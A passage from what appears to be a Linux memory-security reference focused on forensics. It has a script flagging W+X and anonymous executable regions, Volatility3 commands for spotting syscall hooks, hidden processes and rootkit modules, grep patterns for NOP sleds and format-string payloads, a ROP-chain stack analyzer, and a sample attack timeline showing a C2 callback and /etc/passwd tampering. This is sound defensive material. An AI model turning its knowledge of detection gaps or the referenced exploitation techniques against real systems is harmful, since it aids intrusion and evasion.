import csv

findings = []
reader = csv.DictReader(sys.stdin)

for row in reader:
    start = int(row.get("Start", "0"), 0)
    end = int(row.get("End", "0"), 0)
    perms = row.get("Flags", "")
    path = row.get("Path", "")
    size = end - start

    # W+X detection
    if "WRITE" in perms and "EXECUTE" in perms:
        findings.append(f"CRITICAL: W+X region at {start:#x}-{end:#x} "
                        f"({size:#x} bytes) path={path}")

    # Anonymous executable (shellcode indicator)
    if "EXECUTE" in perms and not path:
        findings.append(f"HIGH: Anonymous executable at {start:#x}-{end:#x} "
                        f"({size:#x} bytes)")

    # Large anonymous RW (heap spray indicator)
    if ("WRITE" in perms and "READ" in perms and
            "EXECUTE" not in perms and not path and size > 0x100000):
        findings.append(f"MEDIUM: Large anonymous RW at {start:#x}-{end:#x} "
                        f"({size:#x} bytes) — potential heap spray")

for f in findings:
    print(f)
```

### 24.3 Detecting kernel rootkits via memory analysis

#### Syscall table integrity verification

A rootkit that hooks syscalls modifies the `sys_call_table` entries to point to handler functions outside the kernel text range. Volatility3's `linux.check_syscall` automates this, but manual verification:

```bash
# Using Volatility3
vol3 -f memory.lime linux.check_syscall
# Output shows each syscall number, expected handler, and actual handler.
# Any mismatch indicates a hooked syscall.

# Example output (rootkit detected):
# Index  Syscall    Handler                  Symbol
# 0      sys_read   0xffffffff810abcde       sys_read        [OK]
# 1      sys_write  0xffffffffc0123456       UNKNOWN         [HOOKED]
# The UNKNOWN handler at 0xffffffffc0... is in module address space,
# not kernel text — indicates a rootkit module.
```

#### IDT (Interrupt Descriptor Table) verification

```bash
# Check IDT integrity
vol3 -f memory.lime linux.check_idt
# Hooked interrupt handlers point outside kernel text.
# Critical interrupts to verify:
#   - INT 0x80 (legacy syscall on x86)
#   - INT 0x0E (page fault handler — §9)
#   - INT 0x03 (debug trap — used by debuggers)
```

#### Hidden process detection

```bash
# Method 1: Compare pslist (linked list walk) vs psscan (signature scan)
vol3 -f memory.lime linux.pslist > /tmp/pslist.txt
vol3 -f memory.lime linux.psscan > /tmp/psscan.txt

# Processes in psscan but NOT in pslist are hidden
# (unlinked from task_struct doubly-linked list)
diff <(awk '{print $2}' /tmp/pslist.txt | sort) \
     <(awk '{print $2}' /tmp/psscan.txt | sort)

# Method 2: Check for task_struct unlinked from init_task's list
vol3 -f memory.lime linux.pslist --pid 1  # init
# All processes should be reachable from init_task.
# Hidden processes have their tasks->tasks.next/prev modified.
```

#### Hidden kernel module detection

```bash
# List modules via the kernel's module list
vol3 -f memory.lime linux.lsmod

# Detect hidden modules — scan for module signatures in memory
vol3 -f memory.lime linux.hidden_modules
# Hidden modules appear in memory but are not in the module list.
# They were loaded then unlinked via list_del(&mod->list).

# Check module text integrity (compare against known-good)
vol3 -f memory.lime linux.check_modules
```

### 24.4 User-space memory forensics

#### Heap analysis for exploitation artifacts

After acquiring a process's heap memory (via `linux.proc_maps --dump`), analyze it for exploitation signatures:

```bash
# Extract heap regions from a process dump
vol3 -f memory.lime linux.proc_maps --pid 1234 --dump \
    --output-dir /evidence/heap/

# Search for shellcode signatures in heap dumps
yara -r /path/to/rules/kernel_exploit.yar /evidence/heap/

# Search for NOP sleds (common shellcode precursor)
xxd /evidence/heap/heap_dump.bin | grep -E '(9090 9090|cccc cccc)'

# Search for format string payloads
strings /evidence/heap/heap_dump.bin | grep -E '%[0-9]*\$[nxpsh]'
```

#### Stack frame reconstruction

```python
#!/usr/bin/env python3
"""stack_frame_analyzer.py — reconstruct stack frames from a process
memory dump to identify return addresses and detect ROP chain artifacts.

Usage: python3 stack_frame_analyzer.py <stack_dump_file> <base_addr_hex>
"""
import sys
import struct

KERNEL_RANGE = (0xFFFF800000000000, 0xFFFFFFFFFFFFFFFF)
USER_RANGE   = (0x0000000000001000, 0x00007FFFFFFFFFFF)

def analyze_stack(data, base_addr):
    """Walk 8-byte aligned values looking for return addresses."""
    findings = []
    for offset in range(0, len(data) - 7, 8):
        val = struct.unpack_from("<Q", data, offset)[0]
        addr = base_addr + offset

        # Check if value looks like a code pointer
        if USER_RANGE[0] <= val <= USER_RANGE[1]:
            findings.append((addr, val, "user_ptr"))
        elif KERNEL_RANGE[0] <= val <= KERNEL_RANGE[1]:
            findings.append((addr, val, "kernel_ptr"))

    # Detect ROP chain: sequence of 3+ kernel pointers at consecutive
    # 8-byte offsets (return addresses in a ROP chain)
    rop_candidates = []
    run_start = None
    run_count = 0
    for i, (addr, val, ptype) in enumerate(findings):
        if ptype == "kernel_ptr":
            if run_start is None:
                run_start = i
            run_count += 1
        else:
            if run_count >= 3:
                rop_candidates.append(
                    (findings[run_start][0], run_count,
                     [f[1] for f in findings[run_start:run_start+run_count]]))
            run_start = None
            run_count = 0

    return findings, rop_candidates

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <stack_dump> <base_addr_hex>",
              file=sys.stderr)
        sys.exit(1)

    with open(sys.argv[1], "rb") as f:
        data = f.read()
    base = int(sys.argv[2], 16)

    ptrs, rop = analyze_stack(data, base)
    print(f"Found {len(ptrs)} potential code pointers")

    if rop:
        print(f"\nPotential ROP chain(s) detected:")
        for addr, count, chain in rop:
            print(f"  Address {addr:#x}: {count} consecutive kernel pointers")
            for gadget in chain[:8]:
                print(f"    {gadget:#018x}")
            if count > 8:
                print(f"    ... ({count - 8} more)")

if __name__ == "__main__":
    main()
```

### 24.5 Memory-mapped file forensics

#### Recovering mapped files from memory

When a file is mapped via `mmap`, its pages reside in the page cache. Even if the file has been deleted from disk, the pages remain in memory as long as the mapping exists.

```bash
# List all file-backed mappings for a process
vol3 -f memory.lime linux.proc_maps --pid 1234 | grep -v '\[anon\]'

# Dump all mapped file pages
vol3 -f memory.lime linux.proc_maps --pid 1234 --dump \
    --output-dir /evidence/mapped_files/

# Recover deleted but still-mapped files
# (inode > 0 but no path, or path ends with " (deleted)")
vol3 -f memory.lime linux.proc_maps --pid 1234 | grep '(deleted)'
```

#### Shared memory segment analysis

```bash
# List shared memory segments (SysV and POSIX)
vol3 -f memory.lime linux.iomem
# Look for /dev/shm/* and SYSV* entries in proc_maps

# Dump shared memory contents
vol3 -f memory.lime linux.proc_maps --pid 1234 | grep 'SYSV\|/dev/shm'

# Shared memory is often used for:
# - IPC between exploit stages (dropper -> payload)
# - Staging shellcode without touching disk
# - Covert channels between processes
```

### 24.6 Timeline construction from memory artifacts

Correlating memory state with disk and log evidence builds a forensic timeline that reconstructs the attack sequence.

**Memory timestamps available:**

| Source | Timestamp type | Extraction |
|---|---|---|
| `task_struct.start_time` | Process creation (monotonic) | `vol3 linux.pslist` |
| `task_struct.real_start_time` | Process creation (boot-relative) | `vol3 linux.pslist --columns create_time` |
| `inode.i_mtime` | File modification (for mapped files) | `vol3 linux.find_file` |
| `dentry.d_time` | Directory entry cache time | Filesystem metadata plugins |
| Bash history timestamps | Command execution time | `vol3 linux.bash` |
| Network connection state | Connection establishment | `vol3 linux.sockstat` |

**Timeline construction workflow:**

```bash
# Step 1: Extract process creation times
vol3 -f memory.lime linux.pslist --columns pid,ppid,comm,create_time \
    > /evidence/timeline/processes.csv

# Step 2: Extract network connections
vol3 -f memory.lime linux.sockstat \
    > /evidence/timeline/network.csv

# Step 3: Extract bash history with timestamps
vol3 -f memory.lime linux.bash \
    > /evidence/timeline/bash_history.csv

# Step 4: Extract file access timestamps from mapped files
vol3 -f memory.lime linux.find_file \
    > /evidence/timeline/files.csv

# Step 5: Correlate with system logs (if log partition is in memory)
vol3 -f memory.lime linux.proc_maps --pid 1 | grep 'log'

# Step 6: Build unified timeline
# Merge all CSV files, sort by timestamp, identify:
#   - Process creation that precedes exploitation
#   - File modifications during the exploitation window
#   - Network connections for C2 or exfiltration
#   - Suspicious memory operations (from §23 detection)
```

**Example forensic timeline:**

```
2025-06-15T14:23:01Z  Process created: pid=31337 comm=exploit ppid=31200
2025-06-15T14:23:01Z  Network: pid=31337 connect 10.0.0.1:443 (C2 callback)
2025-06-15T14:23:02Z  Memory: pid=31337 anonymous RWX region 0x7f1234560000
2025-06-15T14:23:02Z  Memory: pid=31337 mprotect W->X on 0x7f1234570000
2025-06-15T14:23:03Z  Process created: pid=31338 comm=sh ppid=31337
2025-06-15T14:23:03Z  File modified: /etc/passwd (inode 12345)
2025-06-15T14:23:04Z  Process created: pid=31339 comm=bash ppid=31338
2025-06-15T14:23:05Z  Network: pid=31339 connect 10.0.0.2:22 (lateral movement)
```

This timeline correlates the exploit process creation, memory manipulation indicators, privilege escalation artifacts (modified `/etc/passwd`), and lateral movement — providing a complete attack narrative for incident response.

---

## 25. Cross-references

**To Domain 1 (binary formats):** The ELF loading sequence (Chapter 1A §5, §12) invokes `mmap` for each `PT_LOAD` segment; `load_elf_binary` is the consumer of the machinery described in §3. RELRO's `mprotect` call (Chapter 1B §5.1) is the same `mprotect` described in §8.1. The vDSO and `AT_SYSINFO_EHDR` (Chapter 1B §10.3) are the vDSO described in §6. The GOT overwrite vector from brk heap overflow (§3.2) is defended by Full RELRO (Chapter 1B §5).

**To Chapter 2B (syscall dispatch, seccomp, ptrace):** `mmap`, `mprotect`, and `brk` are system calls; their dispatch through `entry_SYSCALL_64` and potential filtering by seccomp are covered there. Seccomp-bpf can restrict `mprotect(PROT_EXEC)` calls to prevent shellcode activation (§19.3 provides the detection rules; 2B §3 covers the seccomp filter construction). `ptrace`'s `PTRACE_PEEKDATA`/`PTRACE_POKEDATA` access another process's memory by walking its page tables and reading through the kernel's direct map. `userfaultfd` hooks into the page fault handler (§9) and is used for race-window exploitation (§16.2, with the mechanism detailed in 2B §6). The `vm.unprivileged_userfaultfd` sysctl (§20.1) disables the most common exploitation use of userfaultfd.

**To Chapter 2C (capabilities, namespaces, LSMs, kernel memory security):** KSM, zswap/zram, encrypted swap, and further KPTI detail are covered there. Capability checks gate `mlock` (`CAP_IPC_LOCK`), pagemap PFN reads (`CAP_SYS_ADMIN`, relevant to ret2dir §18.1), and `/dev/mem` access. SELinux's `execmem` permission constrains `mprotect` with `PROT_EXEC` — when enforced, the W+X mappings flagged by the detection rules in §19 are blocked at the LSM layer. The cgroup memory controller limits a process's total memory consumption, interacting with the `mmap`/`brk` accounting in `mm_struct`. eBPF LSM programs (covered in 2C) complement the eBPF tracing probes described in §19.3 by enabling policy enforcement (deny) rather than just detection (alert).

**To Domain 3 (userspace memory corruption):** The format string ASLR leak (§13.1) is the information-disclosure half of format string exploitation; the control-flow hijack via format string writes (`%n`) is covered in Domain 3 Chapter 3A. Stack buffer overflow exploits that trigger the ASLR brute-force (§13.3) and partial overwrite (§13.4) techniques depend on the stack layout and canary mechanisms detailed in 3A. Heap shaping via mmap/munmap (§16) is the address-space complement to the heap exploitation techniques in Domain 3 Chapter 3B.

**To Domain 5 (kernel exploitation):** The kernel heap spray primitives that work in conjunction with physmap spray (§12, §18.1) — `msgsnd`, `add_key`, `sendmsg` — are detailed in Domain 5 Chapter 5A. The ret2dir attack (§18.1) and PTE overwrite (§18.2) are the payloads that convert a kernel write primitive into full compromise; the write primitives themselves (SLUB overflow, use-after-free, msg_msg manipulation) are in 5A. The cross-cache attack techniques (§22.1) and page-level heap spray (§22.2) extend the exploitation primitives covered in 5A with address-space-specific manipulation. The CVE walkthroughs in §21 demonstrate how these primitives chain together in real-world exploits.

**To Domain 6 (mitigation bypass):** ASLR bypass (§13), stack clash (§14), and physmap-based SMEP/SMAP bypass (§18.1) are the process-memory-specific instances of the general mitigation bypass taxonomy in Domain 6 Chapter 6A. The advanced KASLR defeat techniques in §22.4 (EntryBleed, prefetch side-channel) complement the generic bypass methods. The detection and hardening guidance (§19–§20, §23) provides the defensive countermeasures.

**To Domain 7 (speculative execution):** The ASLR side-channel bypasses (§13.5) reference BTB/BHB leaks covered in Domain 7 Chapter 7A. KPTI (§10.3) is the Meltdown mitigation whose performance cost and mechanism are further analysed there. Section 22.6 summarizes the memory-layout implications of speculative execution attacks — the full microarchitectural analysis is in Domain 7.
